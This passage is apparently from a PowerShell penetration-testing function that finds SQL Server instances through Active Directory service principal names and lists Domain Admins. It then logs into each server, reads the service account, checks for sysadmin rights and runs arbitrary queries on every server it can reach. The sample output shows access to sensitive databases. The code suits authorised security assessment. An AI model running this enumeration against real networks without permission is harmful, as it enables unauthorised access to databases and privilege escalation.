	   [+] SUCCESS! - server3.mydomain.com,1433 (192.168.1.103) - Sysadmin: No - SvcIsDA: No 
	   [+] Query sent: select name as 'Databases' from master..sysdatabases where HAS_DBACCESS(name) = 1
	   [+] Query output:
       
	   Databases
	   ---------                                                          
	   master
	   tempdb
	   msdb      
          
	   [+] SUCCESS! - server3.mydomain.com\SQLEXPRESS (192.168.1.103) - Sysadmin: No - SvcIsDA: No
	   [+] Query sent: select name as 'Databases' from master..sysdatabases where HAS_DBACCESS(name) = 1
	   [+] Query output:
                                                                 
	   Databases
	   ---------                                                          
	   master
	   tempdb
	   msdb                                 
          
	   [+] SUCCESS! - server4.mydomain.com\AppData (192.168.1.104) - Sysadmin: Yes - SvcIsDA: Yes       
	   [+] Query sent: select name as 'Databases' from master..sysdatabases where HAS_DBACCESS(name) = 1
	   [+] Query output:
                                                                 
	   Databases
	   ---------                                                          
	   master
	   tempdb
	   msdb
	   PCIDataDB
	   ApplicationDB
	   CompanySecrects                      
             
	   [*] ----------------------------------------------------------------------
	   [*] 3 of 5 SQL Server instances could be accessed.        
	   [*] End Time: 04/03/2014 10:58:00      
	   [*] Total Time: 00:03:00
	   [*] ----------------------------------------------------------------------                 

	 .LINK
	   http://www.netspi.com
	   http://support.microsoft.com/?kbid=304721 to figure out workstation vs server
	   http://msdn.microsoft.com/en-us/library/windows/desktop/ms724832(v=vs.85).aspx
	
	#>
  [CmdletBinding()]
  Param(
    [Parameter(Mandatory=$false,
    HelpMessage='Credentials to use when connecting to a Domain Controller.')]
    [System.Management.Automation.PSCredential]
    [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Domain controller for Domain and Site that you want to query against.')]
    [string]$DomainController,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Maximum number of Objects to pull from AD, limit is 1,000 .')]
    [int]$Limit = 1000,
    
    [Parameter(Mandatory=$false,
    HelpMessage='scope of a search as either a base, one-level, or subtree search, default is subtree.')]
    [ValidateSet('Subtree','OneLevel','Base')]
    [string]$SearchScope = 'Subtree',
    
    [Parameter(Mandatory=$false,
    HelpMessage='Distinguished Name Path to limit search to.')]
    [string]$SearchDN,
    
    [Parameter(Mandatory=$false,
    HelpMessage='At the end of the scan display the results in a pipeable datatable format.')]
    [switch]$ShowSum,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Display a status table after accessing each SQL Server instance successfully.')]
    [switch]$ShowStatus,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set SQL Login username.')]
    [string]$SQLUser,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Set SQL Login password.')]
    [string]$SQLPass,
    
    [Parameter(Mandatory=$false,
    HelpMessage='File containing list of SQL servers. Accepts formats: 192.168.1.100 192.168.1.100,1433 192.168.1.100\CVM')]
    [string]$File,
    
    [Parameter(Mandatory=$false,
    HelpMessage='Allows users to run a custom query on all accessible SQL Server instances.')]
    [string]$Query
  )
  
  Begin
  {        
    # Setup domain user and domain controller (if provided)
    if ($DomainController -and $Credential.GetNetworkCredential().Password)
    {
      $ObjDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
      $ObjSearcher = New-Object System.DirectoryServices.DirectorySearcher $ObjDomain
    }
    else
    {
      $ObjDomain = [ADSI]""  
      $ObjSearcher = New-Object System.DirectoryServices.DirectorySearcher $ObjDomain
    }
  }
  
  Process
  {	
    
    # Setup the user that will be used to connect to the SQL Servers found
    if($SQLUser -and $SQLPass){
      $DBUser = $SQLUser
    }else{
      $DBUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    }
    
    # ----------------------------------------------------------------
    # Setup data tables
    # ----------------------------------------------------------------
    
    # Create data table to house list of Domain Admins
    $TableDomainAdmins = New-Object System.Data.DataTable 
    $TableDomainAdmins.Columns.Add('Account') | Out-Null
    
    # Create data table to house list of SQL Server found in LDAP
    $TableLDAP = New-Object System.Data.DataTable 
    $TableLDAP.Columns.Add('Server') | Out-Null 
    $TableLDAP.Columns.Add('Instance') | Out-Null  
    
    # Create data table to house sql server query data
    $TableSQL = New-Object System.Data.DataTable      
    $TableSQL.Columns.Add('IpAddress') | Out-Null
    $TableSQL.Columns.Add('Server') | Out-Null
    $TableSQL.Columns.Add('Instance') | Out-Null
    $TableSQL.Columns.Add('SQLVer') | Out-Null  
    $TableSQL.Columns.Add('OsVer') | Out-Null 
    $TableSQL.Columns.Add('Sysadmin') | Out-Null 
    $TableSQL.Columns.Add('SvcAcct') | Out-Null 
    $TableSQL.Columns.Add('SvcIsDA') | Out-Null
    $TableSQL.Columns.Add('IsClustered') | Out-Null
    $TableSQL.Columns.Add('DBLinks') | Out-Null   
    
    # ----------------------------------------------------------------
    # Get list of Domain Admins from domain controller via LDAP
    # ----------------------------------------------------------------
    
    $CurrentDomain = $ObjDomain.distinguishedName
    $ObjSearcher.PageSize = $Limit
    $ObjSearcher.Filter = "(&(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,$CurrentDomain))"
    $ObjSearcher.SearchScope = $SearchScope
    $CurrentUser = $Credential.UserName
    
    if ($SearchDN)
    {
      $ObjSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
    }
    
    
    # Place a list of domain admin in data table
    $ObjSearcher.FindAll() | ForEach-Object {
      $TableDomainAdmins.Rows.Add($($_.properties.samaccountname)) | Out-Null                                          
    } 
    
    # ----------------------------------------------------------------
    # Get list of SQL Server instances from domain controller via LDAP
    # ----------------------------------------------------------------
    
    # Setup LDAP query parameters
    $CurrentDomain = $ObjDomain.distinguishedName
    $ObjSearcher.PageSize = $Limit
    $ObjSearcher.Filter = '(ServicePrincipalName=*MSSQLSvc*)'
    $ObjSearcher.SearchScope = $SearchScope        
    
    if ($SearchDN)
    {
      $ObjSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
    }        
    
    # Status user
    [string]$CurrentUser = $Credential.UserName
    if ($CurrentUser -eq ""){
      $LDAPUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    }else{
      $LDAPUser = $Credential.UserName            
    }
    $StatusDomain = [system.directoryservices.activedirectory.domain]::GetCurrentDomain().PdcRoleOwner.Domain.Name
    $StatusDC = [system.directoryservices.activedirectory.domain]::GetCurrentDomain().PdcRoleOwner.Name        
    $StartTime = Get-Date
    Write-Host '[*] ----------------------------------------------------------------------'
    Write-Host "[*] Start Time: $StartTime"        
    Write-Host "[*] Domain: $StatusDomain"
    Write-Host "[*] DC: $StatusDC"
    Write-Host "[*] Getting list of SQL Server instances from DC as $LDAPUser..."         
    
    # Get a count of the number of accounts that match the LDAP query
    $Records = $ObjSearcher.FindAll()
    $RecordCount = $Records.count
    
    # Check if any SQL Servers were found in Active Directory
    if ($RecordCount -gt 0){              
      
      # Process LDAP query results                
      $ObjSearcher.FindAll() | ForEach-Object {               
        
        # Start processing
        $SPN_Count = $_.properties['ServicePrincipalName'].count
        if ($SPN_Count -gt 0)
        {
          # Parse records from ldap
          foreach ($item in $_.properties['ServicePrincipalName'])
          {
            # Grab hostname and service type
            $SpnServer =  $item.split('/')[1].split(':')[0]
            $SpnServerFull = $item.split('/')[1] 	
            $SpnService =  $item.split('/')[0]  
            
            # Filter for only SQL Server instances
            if ($SpnService -eq 'MSSQLsvc'){                                            
              
              # Check if a port or named instance is used
              $ConnectParse = $item.split("/")[1].split(":")[1]                             
              Add-Type -Assembly Microsoft.VisualBasic
              $ConType = [Microsoft.VisualBasic.Information]::IsNumeric($ConnectParse)
              if($Contype -eq 'True'){
                $SpnServerInstance = $SpnServerFull -replace ':', ',' 
              }else{
                $SpnServerInstance = $SpnServerFull -replace ':', '\'                             
              } 
              
              # Add SQL Server instance to list
              $TableLDAP.Rows.Add($SpnServer, $SpnServerInstance) | Out-Null  
            }
          }
        }                                
      } 
      
      # Status user
      $SQLServerCount = $TableLDAP.Rows.Count
      Write-Host "[*] $SQLServerCount SQL Server instances found in LDAP."      
      
      # ------------------------------------------------------------
      # Get list of SQL Servers from a file (if one was provided)
      # ------------------------------------------------------------  
      if($File){
        
        # Check if file exists
        [string]$FileExist = Test-Path $File
        
        if ($FileExist -eq 'True'){
          
          # Import list of SQL Server instances from file to TableLDAP
          Get-Content $File | ForEach-Object {
            
            # Test current item
            $TheInstance = $_
            
            # Parse server and instance 
            If($TheInstance.Contains(',') -eq 'True'){
              $TheServer = $TheInstance.split(',')[0]
            }elseif($TheInstance.Contains('\') -eq 'True'){
              $TheServer = $TheInstance.split('\')[0]
            }else{
              $TheServer = $TheInstance
            }                                
            
            # Add server and instance to TableLDAP datatable
            $TableLDAP.Rows.Add($TheServer,$TheInstance) | Out-Null                           
          }
          
          # Update counters
          $SQLServerFinalCount = $TableLDAP.Rows.Count
          $SQLServerList = $SQLServerFinalCount-$SQLServerCount
          
          Write-Host "[*] $SQLServerList SQL Server instances found in $File"
          
        }else{
          
          # Status user
          Write-host '[-] The file provided does not exist.'
        }
      }else{
        $SQLServerFinalCount = $TableLDAP.Rows.Count
      }
      
      # ------------------------------------------------------------
      # Test access to each SQL Server instance and grab basic info
      # ------------------------------------------------------------ 
      
      # Status user
      Write-Host "[*] Attempting to login into $SQLServerFinalCount SQL Server instances as $DBUser..."
      Write-Host '[*] ----------------------------------------------------------------------'  
      
      # Display results in list view that can feed into the pipeline
      $TableLDAP |  Sort-Object server,instance| select server,instance -unique | foreach {
        
        #------------------------
        # Setup connection string
        #------------------------
        
        $conn = New-Object System.Data.SqlClient.SqlConnection
        $SQLServer = $_.server
        $SQLInstance = $_.instance       
        
        # Set authentication type      
        if($SQLUser -and $SQLPass){   
          
          # SQL login
          $conn.ConnectionString = "Server=$SQLInstance;Database=master;User ID='$SQLUser';Password='$SQLPass';" 
        }else{
          
          # Trusted connection
          $conn.ConnectionString = "Server=$SQLInstance;Database=master;Integrated Security=SSPI;"                     
        }
        
        #-------------------------
        # Test database conection
        #-------------------------
        
        # Check if the server is up via ping
        if((Test-Connection -Cn $SQLServer -BufferSize 32 -Count 2 -ea 0 -quiet)) 
        {
          
          # Attempt to authenticate and query remote SQL Server instance
          Try 
          {
            
            # Get host ip address for SQL Server
            $SQLServerIP = [Net.Dns]::GetHostEntry($SQLServer).AddressList.IPAddressToString.split(" ")[0]
            
            # Create connection to system and issue query 
            $conn.Open()                        
            $sql= @"

                        -- Setup reg path 
                        DECLARE @SQLServerInstance varchar(250)  
                        if @@SERVICENAME = 'MSSQLSERVER'
                        BEGIN											
                            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQLSERVER'
                        END						
                        ELSE
                        BEGIN
                            set @SQLServerInstance = 'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME as varchar(250))		
                        END

                        -- Grab service account from service's reg path
                        DECLARE @ServiceaccountName varchar(250)  
                        EXECUTE master.dbo.xp_instance_regread  
                        N'HKEY_LOCAL_MACHINE', @SQLServerInstance,  
                        N'ObjectName',@ServiceAccountName OUTPUT, N'no_output' 

                        DECLARE @MachineType  SYSNAME
                        EXECUTE master.dbo.xp_regread
                        @rootkey      = N'HKEY_LOCAL_MACHINE',
                        @key          = N'SYSTEM\CurrentControlSet\Control\ProductOptions',
                        @value_name   = N'ProductType', 
                        @value        = @MachineType output
                        
                        -- Grab more info about the server
                        SELECT @@servername as server,
                        @MachineType as MachineType,
                        serverproperty('edition') as Edition,
                        SERVERPROPERTY('productversion') as sqlver,
                        RIGHT(SUBSTRING(@@VERSION, CHARINDEX('Windows NT', @@VERSION), 14), 3) as osver,
                        is_srvrolemember('sysadmin') as priv, 
                        (select SERVERPROPERTY('IsClustered')) as IsClustered,
                        (select count(srvname) from master..sysservers) as DBLinks,
                        @ServiceAccountName as SvcAcct
"@
            
            $cmd = New-Object System.Data.SqlClient.SqlCommand($sql,$conn)
            $cmd.CommandTimeout = 0
            $results = $cmd.ExecuteReader()
            $MyTempTable = new-object 'System.Data.DataTable'
            $MyTempTable.Load($results)
            
            # Parse query data from SQL Server and add info to data table
            foreach ($row in $MyTempTable){                             
              
              $Edition = $($MyTempTable.Edition)
              
              # Set the SQL Server version
              $SQLVersioncheck = $MyTempTable.sqlver.split('.')[0]
              if ( $SQLVersioncheck -eq '7' ){ $SQLVersion = "7 $Edition" }
              elseif ( $SQLVersioncheck -eq '8' ){ $SQLVersion = "2000 $Edition" }
              elseif ( $SQLVersioncheck -eq '9' ){ $SQLVersion = "2005 $Edition" }
              elseif ( $SQLVersioncheck -eq '10' ){ $SQLVersion = "2008 $Edition" }
              elseif ( $SQLVersioncheck -eq '11' ){ $SQLVersion = "2012 $Edition" }
              else { $SQLVersion = $MyTempTable.sqlver }
              
              # Set the Windows version
              $OSVersioncheck = $MyTempTable.osver.split('.')[0]+'.'+$MyTempTable.osver.split(".")[1]
              if ( $OSVersioncheck -eq '6.3' -and $($MyTempTable.MachineType) -eq 'ServerNT'){ $OSVersion = '2012' }                            
              elseif ( $OSVersioncheck -eq '6.3' -and $($MyTempTable.MachineType) -eq 'WinNT'){ $OSVersion = '8.1' }  
              elseif ( $OSVersioncheck -eq '6.2' -and $($MyTempTable.MachineType) -eq 'ServerNT'){ $OSVersion = '2012' }
              elseif ( $OSVersioncheck -eq '6.2' -and $($MyTempTable.MachineType) -eq 'WinNT'){ $OSVersion = '8' }
              elseif ( $OSVersioncheck -eq '6.1' -and $($MyTempTable.MachineType) -eq 'ServerNT'){ $OSVersion = '2008 R2' }
              elseif ( $OSVersioncheck -eq '6.1' -and $($MyTempTable.MachineType) -eq 'WinNT'){ $OSVersion = '7' }
              elseif ( $OSVersioncheck -eq '6.0' -and $($MyTempTable.MachineType) -eq 'ServerNT'){ $OSVersion = '2008' }
              elseif ( $OSVersioncheck -eq '6.0' -and $($MyTempTable.MachineType) -eq 'WinNT'){ $OSVersion = 'Vista' }
              elseif ( $OSVersioncheck -eq '5.2' -and $($MyTempTable.MachineType) -eq 'ServerNT'){ $OSVersion = '2003' }
              elseif ( $OSVersioncheck -eq '5.1' -and $($MyTempTable.MachineType) -eq 'ServerNT'){ $OSVersion = '2003' }
              elseif ( $OSVersioncheck -eq '5.1' -and $($MyTempTable.MachineType) -eq 'WinNT'){ $OSVersion = 'XP' }
              elseif ( $OSVersioncheck -eq '5.0' -and $($MyTempTable.MachineType) -eq 'ServerNT'){ $OSVersion = '2000' }
              else { $OSVersion = $MyTempTable.osver }
              
              # Check if user is a sysadmin
              if ($($MyTempTable.priv) -eq 1){
                $DBAaccess = 'Yes'
              }else{
                $DBAaccess = 'No'
              }
              
              # Check if server is clustered
              if ($($MyTempTable.IsClustered) -eq 1){
                $IsClustered = 'Yes'
              }else{
                $IsClustered = 'No' 
              }
              
              # Check if server has database links - removing one, because a link to 
              # always exists to itself without data access
              if ($($MyTempTable.DBLinks) -le 1){
                $DBLinks = 0
              }else{
                $DBLinks = $MyTempTable.DBLinks-1
              }
              
              # Check if service account is a domain admin
              $IsDA = 'No' 
              $JustAccount = $($MyTempTable.SvcAcct).split('\')[1]
              $TableDomainAdmins | ForEach-Object {
                
                $DAUser=$_.Account                                
                if( $DAUser -eq $JustAccount){
                  $IsDA = 'Yes' 
                }                                                                    
              }
              
              # Set service account
              $SQLServiceAccount = $($MyTempTable.SvcAcct)
              
              # Add the SQL Server information to the data table
              $TableSQL.Rows.Add($SQLServerIP, $SQLServer, $SQLInstance, $SQLVersion,$OSVersion,$DBAaccess,$($MyTempTable.SvcAcct),$IsDA,$IsClustered,$DBLinks) | Out-Null     
              
            }                                                  
            
            # Set status color   
            if ( $DBAaccess -eq 'Yes'){ $LineColor = 'red' }
            elseif ($IsDA -eq 'Yes' ){  $LineColor = 'red'  }
            else{ $LineColor = 'green' }
            
            # Status user
            Write-Host "[+] SUCCESS! - $SQLInstance ($SQLServerIP) - Sysadmin: $DBAaccess - SvcIsDA: $IsDA"  -foreground $LineColor                              
            
            # Run custom querys                           
            if($query){
              
              # Status user
              Write-Host "[+] Custom query sent: $query" -foreground $LineColor 
              Write-Host '[+] Query output:' -foreground $LineColor 
              
              # Set custom SQL query
              $sql= @"

                          -- custom query 
                          $query
"@
              $cmd = New-Object System.Data.SqlClient.SqlCommand($sql,$conn)
              $cmd.CommandTimeout = 0
              $results = $cmd.ExecuteReader()
              $MyTempTable2 = new-object 'System.Data.DataTable'
              $MyTempTable2.Load($results)
              
              # Display custom query results                  
              $MyTempTable2 
            }                        
            
            # Show status table
            if($ShowStatus){                            
              $TableSQL | Format-Table -Autosize
            }
            
            # close connection                            
            $conn.Close();                           
            
          }
          Catch {
            
            # Status user
            Write-Host "[-] Failed   - $SQLInstance ($SQLServerIP) is up, but authentication/query failed"                        
          }
          
        }else{
          
          # Status user
          Write-Host "[-] Failed   - $SQLInstance is not responding to pings"
        }
        
      } # End SQL Server ping loop
      
      #-------------------------
      # Display final results
      #-------------------------
      $EndTime = Get-Date
      $TotalTime = NEW-TIMESPAN –Start $Starttime –End $Endtime   
      $SQLServerLoginCount = $TableSQL.Rows.count
      
      #Display total servers and time                
      Write-Host '[*] ----------------------------------------------------------------------'  
      Write-Host "[*] $SQLServerLoginCount of $SQLServerCount SQL Server instances could be accessed."                                             
      Write-Host "[*] End Time: $Endtime"                
      Write-Host "[*] Total Time: $TotalTime" 
      Write-Host '[*] ----------------------------------------------------------------------' 
      
      # Display final results table                
      if($ShowSum){
        $TableSQL 
      }      
      
    }else{
      
      # Display fail            
      Write-Host '[-] No SQL Servers were found in Active Directory.'            
      
    } # End database loop    
  }  # End process   
}  # End Get-SQLServerACcess funtion             



